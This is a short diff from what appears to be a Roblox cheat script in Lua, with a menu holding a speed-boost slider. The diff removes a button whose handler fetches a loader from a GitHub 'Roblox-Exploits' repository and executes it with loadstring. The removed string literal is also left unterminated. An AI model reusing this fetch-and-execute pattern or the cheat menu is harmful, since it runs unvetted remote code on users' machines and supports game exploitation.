@@ -1344,16 +1344,6 @@ function Script.Functions.Alert(message: string, time_obj: number)
 end
 
 --// Main \\--
-
-
-local MyButton = LeftGroupBox:AddButton({
-	Text = 'Guidding light,
-	Func = function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
-	end,
-	DoubleClick = false,
-	Tooltip = 'This is the main button'
-})
 local PlayerGroupBox = Tabs.Main:AddLeftGroupbox("Player") do
     PlayerGroupBox:AddSlider("SpeedSlider", {
         Text = "Speed Boost",
